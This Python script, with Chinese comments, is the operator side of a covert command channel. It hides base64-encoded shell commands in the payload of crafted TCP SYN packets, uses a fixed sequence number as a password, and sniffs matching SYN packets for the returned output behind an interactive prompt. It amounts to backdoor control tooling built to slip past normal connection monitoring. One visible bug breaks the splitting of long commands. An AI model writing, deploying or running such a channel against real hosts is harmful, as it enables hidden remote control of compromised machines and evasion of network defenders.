import base64
import time

from scapy.all import *
import argparse
import threading
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from  termcolor import cprint

# 创建一个锁
lock = threading.Lock()
exitFlag = False
printFlag = False

# TODO:使用tcp syn包进行握手操作:简化，使用passwd验证，passwd可使用seq_num


#TODO: 实现长数据的分段发送和接收
class ReceiveData():
    def __init__(self,filter):
        self.filter = filter
        self.total = 0
        self.raw={}
        self.data=""
        self.packets = None

    # 假设获取到的数据包都是端对端，没有丢包或第三方干扰
    def Receive(self):
        # 先获取第一个数据包
        packets = sniff(filter=self.filter, count=1,timeout=1)
        self.packets = packets
        if len(packets) == 0:
            self.data = ""
            return

        data = packets[0].getlayer(Raw).load.decode('utf-8')
        # 去除最后的换行符
        if data.endswith('\n'):
            data=data[:-1]
        # 如果data形式为：Nums:total_num:可继续拓展
        if data.startswith("Nums:"):
            data = data.split(":")
            self.total = int(data[1])
            # 由于可能会抓包错误，这里包的个数设置为total+3
            timeout=self.total//20+0.8
            addcount=self.total//5+1
            packets = sniff(filter=self.filter, count=addcount,timeout=timeout)
            # 如果包个数不为total，说明有丢包
            if len(packets) < self.total:
                data=""
                return

            #后续每个包格式为totalnum:num:data
            for packet in packets:
                data = packet.getlayer(Raw).load.decode('utf-8')
                if data.endswith('\n'):
                    data = data[:-1]

                if(data.startswith(str(self.total)+":")):
                    data = data.split(":")
                    self.raw[int(data[1])] = data[2]
                else:
                    pass

            # 检查是否有丢包
            for i in range(self.total):
                if i not in self.raw.keys():
                    cprint("Packet loss! May thr network is unstable!","red")
                    data=""
                    return

            # 按照顺序拼接数据
            for i in range(self.total):
                # 先base64解码
                self.raw[i]=base64.b64decode(self.raw[i].encode()).decode()
                self.data += self.raw[i]


        elif data.startswith("Num:"):
            data=data.split(":")[1]
            self.data = data
            # base64解码
            self.data = base64.b64decode(self.data).decode()
    # 直接返回最后的数据

    def main(self):
        self.Receive()
        return self.data,self.packets

class SendData():
    def __init__(self,src_ip,dst_ip,src_port,dst_port,seq_num,data):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.src_port = src_port
        self.dst_port = dst_port
        self.seq_num = seq_num
        self.data = data
        self.total = 0
        self.raw = {}
    def Send(self,data):
        self.data = data
        # 每个数据包最多发送100个字符
        if len(self.data) > 100:
            ret=self.data%100
            if(ret!=0):
                self.total = len(self.data) // 100 + 1
            else:
                self.total = len(self.data) // 100
            # 先发送一个数据包，告诉对方总共有多少个数据包
            send_syn_packet(self.src_ip, self.dst_ip, self.src_port, self.dst_port, self.seq_num, "Nums:" + str(self.total))
            # 给对方一点时间
            time.sleep(0.5)
            # 每个数据包格式为：Nums:totalnum:num:data
            for i in range(self.total):
                self.raw[i] = self.data[i * 100:(i + 1) * 100]
                # base64编码
                self.raw[i]=base64.b64encode(self.raw[i].encode()).decode()
                send_syn_packet(self.src_ip, self.dst_ip, self.src_port, self.dst_port, self.seq_num, str(self.total)+":" + str(i) + ":" + self.raw[i])

        else:
            self.total = 1
            # base64编码
            self.data=base64.b64encode(self.data.encode()).decode()
            # 发送一个数据包
            send_syn_packet(self.src_ip, self.dst_ip, self.src_port, self.dst_port, self.seq_num, "Num:" + self.data)

def send_syn_packet(src_ip, dst_ip, src_port, dst_port, seq_num, command):
    # 创建Ethernet层
    eth = Ether()
    # 创建IP层
    ip = IP(src=src_ip, dst=dst_ip)
    # 创建TCP层，设置SYN标志
    tcp = TCP(sport=src_port, dport=dst_port, flags='S', seq=seq_num)
    # 创建Raw层，携带自定义数据
    raw = Raw(load=command)
    # 组合并发送数据包
    packet = eth/ip/tcp/raw
    sendp(packet, verbose=0)

def packet_filter(packet,passwd):
    # 检查数据包是否包含TCP层
    if packet[TCP].seq == passwd:
        return True
    return False
# 接受syn-syn包，输出raw层的数据
def receive_syn_ack_packet(dst_ip,dst_port,src_ip,src_port,password):
    global printFlag
    global exitFlag
    # 过滤条件:通过tcp协议，目的端口为port ip为dst ip,源端口为port 源ip为src ip,并且为syn包
    filter = f'tcp and dst port {dst_port} and dst host {dst_ip} and src port {src_port} and src host {src_ip} and tcp[tcpflags] & tcp-syn != 0'
    count = 0
    requestcount=0
    R=ReceiveData(filter)
    while(True):

        if exitFlag is True or count > 500:
            cprint("Connection Quit", "green")
            exit(0)

        if  printFlag is True and requestcount > 5:
            cprint("Request timeout!","red")
            printFlag = False
            requestcount = 0
            continue

        # 抓取数据包：此处在抓取到数据包后会阻塞，直到抓取到数据包
        data,packets=R.main()

        # 超时则是一个空列表
        if len(packets) == 0 or data == "":
            count += 1
            if printFlag:
                requestcount += 1
            continue
        if(packet_filter(packets[0],password) is False):
            continue
        # 到达此处说明抓取到了数据包
        if printFlag:
            break

    with lock:
        # 去除末尾的换行符
        data=data[:-1]
        # 输出数据
        print(data)
        printFlag = False

def receive(dst_ip,dst_port,src_ip,src_port,password):
    while True:
        receive_syn_ack_packet(dst_ip,dst_port,src_ip,src_port,password)

if __name__ == '__main__':
    args=argparse.ArgumentParser()
    args.add_argument('-s','--src',type=str,help='src ip',required=True)
    args.add_argument('-d','--dst',type=str,help='dst ip',required=True)
    args.add_argument('-sp','--src_port',type=int,help='src port',required=True)
    args.add_argument('-dp','--dst_port',type=int,help='dst port',required=True)
    args.add_argument('-P','--Passwd',type=int,help='Passwd',default=15432)
    args=args.parse_args()

    # 创建另一个threading，接受syn-syn包
    # 创建线程
    t = threading.Thread(target=receive,args=(args.src,args.src_port,args.dst,args.dst_port,args.Passwd))
    # 启动线程
    t.start()
    S=SendData(args.src,args.dst,args.src_port,args.dst_port,args.Passwd,"")

    while(True):
        if printFlag is False:
            with lock:
                command = input(">> ")
            if command == '':
                continue
            if command == 'exit':
                exitFlag = True
                exit(0)
            if command == 'close':
                S.Send(command)
                exitFlag = True
                exit(0)
            # 发送syn包
            S.Send(command)
            printFlag = True


